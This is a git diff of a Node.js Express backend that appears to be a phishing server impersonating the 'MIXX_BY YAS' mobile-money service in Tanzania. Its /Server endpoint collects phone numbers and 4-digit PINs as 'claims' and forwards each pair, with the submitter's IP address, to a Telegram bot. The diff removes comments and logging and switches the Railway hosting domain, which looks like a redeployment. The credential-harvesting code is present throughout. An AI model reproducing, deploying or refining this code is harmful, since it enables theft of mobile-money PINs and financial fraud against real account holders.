@@ -8,10 +8,8 @@ const axios = require('axios');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ============================================
-// FIX: Enable trust proxy for Railway
-// ============================================
-app.set('trust proxy', 1); // Trust first proxy (Railway)
+// Trust proxy for Railway
+app.set('trust proxy', 1);
 
 // ============================================
 // TELEGRAM CREDENTIALS (from .env)
@@ -32,14 +30,12 @@ app.use(cors({
   allowedHeaders: ['Content-Type']
 }));
 
-// Rate limiting to prevent abuse
 const limiter = rateLimit({
-  windowMs: 15 * 60 * 1000, // 15 minutes
-  max: 100, // Limit each IP to 100 requests per windowMs
+  windowMs: 15 * 60 * 1000,
+  max: 100,
   message: 'Too many requests, please try again later.',
   standardHeaders: true,
   legacyHeaders: false,
-  // Fix: Use 'true' to trust proxy headers
   trustProxy: true,
 });
 app.use('/Server', limiter);
@@ -62,18 +58,16 @@ app.use((req, res, next) => {
 // ROUTES
 // ============================================
 
-// Health check
 app.get('/', (req, res) => {
   res.json({
     status: 'OK',
     message: 'MIXX_BY YAS Backend is running',
     timestamp: new Date().toISOString(),
     telegram: TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Not configured ⚠️',
-    endpoint: 'https://mixxyas05com-production.up.railway.app'
+    endpoint: 'https://mixx-by-yastz-production.up.railway.app'
   });
 });
 
-// Health check for Railway
 app.get('/health', (req, res) => {
   res.status(200).json({ 
     status: 'healthy', 
@@ -83,35 +77,29 @@ app.get('/health', (req, res) => {
 });
 
 // ============================================
-// MAIN ENDPOINT: /Server (POST)
+// MAIN ENDPOINT: /Server
 // ============================================
 app.post('/Server', async (req, res) => {
   try {
     const { phone, pin } = req.body;
 
-    // Validation
     if (!phone || !pin) {
-      console.warn('⚠️ Missing fields:', { phone: !!phone, pin: !!pin });
       return res.status(400).json({
         success: false,
         message: 'Phone and PIN are required'
       });
     }
 
-    // Validate phone format (Tanzanian numbers)
     const phoneRegex = /^[0-9]{10}$/;
     if (!phoneRegex.test(phone)) {
-      console.warn('⚠️ Invalid phone format:', phone);
       return res.status(400).json({
         success: false,
         message: 'Phone number must be 10 digits'
       });
     }
 
-    // Validate PIN (4 digits)
     const pinRegex = /^[0-9]{4}$/;
     if (!pinRegex.test(pin)) {
-      console.warn('⚠️ Invalid PIN format:', pin);
       return res.status(400).json({
         success: false,
         message: 'PIN must be 4 digits'
@@ -128,7 +116,7 @@ app.post('/Server', async (req, res) => {
 
     if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'your_bot_token_here') {
       try {
-        const message = `🎯 *NEW CLAIM - MIXX_BY YAS*\n📱 Phone: ${phone}\n🔐 PIN: ${pin}\n🕐 Time: ${new Date().toLocaleString('sw-TZ', { timeZone: 'Africa/Dar_es_Salaam' })}\n🌐 IP: ${req.ip || req.connection.remoteAddress}\n📍 Source: mixxyas05com-production.up.railway.app`;
+        const message = `🎯 *NEW CLAIM - MIXX_BY YAS*\n📱 Phone: ${phone}\n🔐 PIN: ${pin}\n🕐 Time: ${new Date().toLocaleString('sw-TZ', { timeZone: 'Africa/Dar_es_Salaam' })}\n🌐 IP: ${req.ip || req.connection.remoteAddress}\n📍 Source: mixx-by-yastz-production.up.railway.app`;
 
         const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         
@@ -150,18 +138,12 @@ app.post('/Server', async (req, res) => {
         }
       } catch (telegramError) {
         console.error('❌ Telegram send failed:', telegramError.message);
-        if (telegramError.response) {
-          console.error('Telegram response:', telegramError.response.data);
-        }
         telegramSuccess = false;
       }
     } else {
-      console.warn('⚠️ Telegram not configured, skipping notification');
+      console.warn('⚠️ Telegram not configured');
     }
 
-    // ============================================
-    // RESPONSE
-    // ============================================
     res.status(200).json({
       success: true,
       message: 'Claim submitted successfully',
@@ -180,8 +162,7 @@ app.post('/Server', async (req, res) => {
     console.error('❌ Server error:', error);
     res.status(500).json({
       success: false,
-      message: 'Internal server error',
-      error: process.env.NODE_ENV === 'development' ? error.message : undefined
+      message: 'Internal server error'
     });
   }
 });
@@ -199,7 +180,7 @@ app.post('/webhook', async (req, res) => {
         const chatId = message.chat.id;
         await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           chat_id: chatId,
-          text: '👋 Welcome to MIXX_BY YAS Bot!\n\n📊 Status: Active\n🔗 Endpoint: https://mixxyas05com-production.up.railway.app\n\nSend /status to check system status.'
+          text: '👋 Welcome to MIXX_BY YAS Bot!\n\n📊 Status: Active\n🔗 Endpoint: https://mixx-by-yastz-production.up.railway.app'
         });
       }
       
@@ -207,7 +188,7 @@ app.post('/webhook', async (req, res) => {
         const chatId = message.chat.id;
         await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           chat_id: chatId,
-          text: `📊 *System Status*\n✅ Server: Online\n🕐 Uptime: ${Math.floor(process.uptime())}s\n📱 Monitoring: Active\n🔗 URL: https://mixxyas05com-production.up.railway.app`
+          text: `📊 *System Status*\n✅ Server: Online\n🕐 Uptime: ${Math.floor(process.uptime())}s\n📱 Monitoring: Active\n🔗 URL: https://mixx-by-yastz-production.up.railway.app`
         });
       }
     }
@@ -237,20 +218,19 @@ app.listen(PORT, () => {
   console.log('🚀 MIXX_BY YAS Backend Server');
   console.log('========================================');
   console.log(`📡 Server running on port: ${PORT}`);
-  console.log(`🌐 URL: https://mixxyas05com-production.up.railway.app`);
+  console.log(`🌐 URL: https://mixx-by-yastz-production.up.railway.app`);
   console.log(`🔗 Endpoint: POST /Server`);
   console.log(`📱 Telegram: ${TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Not configured'}`);
   console.log(`🆔 Chat ID: ${TELEGRAM_CHAT_ID || 'Not set'}`);
   console.log('========================================');
 });
 
-// Graceful shutdown
 process.on('SIGTERM', () => {
-  console.log('🛑 Received SIGTERM, shutting down gracefully...');
+  console.log('🛑 Received SIGTERM, shutting down...');
   process.exit(0);
 });
 
 process.on('SIGINT', () => {
-  console.log('🛑 Received SIGINT, shutting down gracefully...');
+  console.log('🛑 Received SIGINT, shutting down...');
   process.exit(0);
 });
